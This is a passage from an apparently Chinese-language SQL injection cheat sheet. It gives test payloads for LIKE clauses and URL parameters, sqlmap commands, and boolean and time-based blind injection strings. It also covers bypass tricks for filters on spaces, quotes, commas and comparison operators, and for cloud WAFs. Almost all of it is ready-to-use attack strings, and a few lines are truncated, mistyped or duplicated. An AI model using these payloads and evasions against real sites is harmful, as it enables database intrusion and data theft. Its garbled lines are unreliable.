    #第一种测试方式
    %' and '%1%'='%1
    %' and '%1%'='%2
    #第二种测试方式，因为有的语法是like "%"
    1%  #查询包含1的数据
    %   #因为没有包含数据，可以查询出所有的数据
**工具**
    python sqlmap.py -r data.txt --level 3 --dbs --batch
### url中
**手工**
1、测试步骤
    1）、加单引号，URL：xxx.xxx.xxx/xxx.php?id=3'；对应的sql：select * from table where id=3' 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常。
    2）、加and 1=1 ，URL：xxx.xxx.xxx/xxx.php?id=3 and 1=1；对应的sql：select * from table where id=3' and 1=1 语句执行正常，与原始页面没有差异。
    3）、加and 1=2，URL：xxx.xxx.xxx/xxx.php?id=3 and 1=2；对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异。
    4）、满足以上3个条件则存在数字型注入
2、测试方法
    #第一种测试方式
    xxx?id=1'
    #第二种测试方式
    xxx?id=1 and 1=1#  （xxx?id=1 and 1=1--  xxx?id=1 and 1=1--+）
    xxx?id=1 and 1=2#  （xxx?id=1 and 1=2--  xxx?id=1 and 1=2--+）
    #第三种测试方式
    xxx?id=171-1    #正常
    xxx?id=171-180  #错误
    #第四种测试方式
    xxx?id=171-1    #正常
    xxx?id=171-180  #错误
    #第五种测试方式
    xxx?id=171*1    #正常
    xxx?id=171*180  #错误
    #第六种测试方式
    xxx?id=171/1    #正常
    xxx?id=171/180  #错误
**工具**
    python sqlmap.py -r data.txt --level 3 --dbs --batch
### 盲注
#### 布尔盲注
    Left判断
    ?id=1' and left(database(),1)='s' --+
    ?id=1' and left(database(),2) > 'sa' --+
    Like语句判断
    ?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1)like 'e%'--+
    Ascii语句判断
    and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115--+
#### 时间盲注
1、判断注入点
    ?id=1' and sleep(5)--+ //正常休眠
    ?id=1" and sleep(5)--+ //无休眠
    ?id=1') and sleep(5)--+//无休眠
    ?id=1") and sleep(5)--+//无休眠
    ?id=1' and if(length(database())=8,sleep(10),1)--+
# bypass
### 绕过空格
1、playload
    %20 %09 %0a %0b %0c %0d %a0 %00 /**/ /!/ + ()
2、最基本的绕过方法，用注释替换空格：/ _注释_ /
3、可以使用"+"绕过空格，"+"号到数据库后自动转换空格。
4、括号绕过空格，这种过滤方法常常用于time based盲注，例如：
    ?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
### 绕过引号
1、playload
    1）、16进制
    2）、ASCII编码
    3）、url编码（后台要url解码）
#### 16进制
1、使用 16 进制绕过引号。一般会使用到引号的地方是在最后的 where 子句中，比如：select * from baijiacms_user
where username="admin"
2、将`admin`十六进制后进行查询username=0x61646D696E，还是可以成功查询
3、中文是不能采用16进制的，会报错
#### ASCII编码
1、admin的各个字符的ascii值为：97-100-109-105-110
。所以我们可以使用concat(char(97),char(100),char(109),char(105),char(110)) 来代替admin。
2、sql语句`select * from baijiacms_user where
username=concat(char(97),char(100),char(109),char(105),char(110))`，成功查询
### 绕过逗号
1、在使用盲注的时候，会使用到 substr 、substring() 、mid() 、limit
等函数。这些函数都需要用到逗号。如果只是过滤了逗号，则对于substr、substring() 和 mid() 这两个函数可以使用from
for的方式来绕过。对于limit ，可以用 offset 绕过。substr、substring、mid三个函数的功能用法均一致。
2、substr() 逗号绕过
    select * from test where id=1 and (select ascii(substr(username,2,1)) from admin limit 1)>97;
    select * from test where id=1 and (select ascii(substr(username from 2 for 1))from admin limit 1)>97;
3、substring() 逗号绕过
    select * from test where id=1 and (select ascii(substring(username,2,1)) from admin limit 1)>97;
    select * from test where id=1 and (select ascii(substring(username from 2 for 1))from admin limit 1)>97;
4、mid() 逗号绕过
    select * from test where id=1 and (select ascii(mid(username,2,1)) from admin limit 1)>97;
    select * from test where id=1 and (select ascii(mid(username from 2 for 1))from admin limit 1)>97;
5、limit 逗号绕过
    select * from test where id=1 limit 1,2; 
    select * from test where id=1 limit 2 offset 1;
### 绕过比较符<>
1、在使用盲注的时候，会用到二分法来比较操作符来进行操作。如果过滤了比较操作符，那么就需要使用到
greatest()和lease（）来进行绕过。greatest()返回最大值，least()返回最小值。  
greatest(n1,n2,n3.....)返回输入参数的最大值；  
least(n1,n2,n3....)返回输入参数的最小值
2、greatest与least
    select * from users where id=1 and ascii(substring(database(),0,1))>64;
    select * from users where id=1 and greatest(ascii(substring(database(),0,1)),64);
    select * from users where id=1 and ascii(substring(database(),0,1))100) and (SELECT count(*) FROM information_schema.tables A, information_schema.columns B, information_schema.TABLES C);
### 绕过云WAF
1、又是找到真实IP，使用真实IP访问就可以绕过云WAF。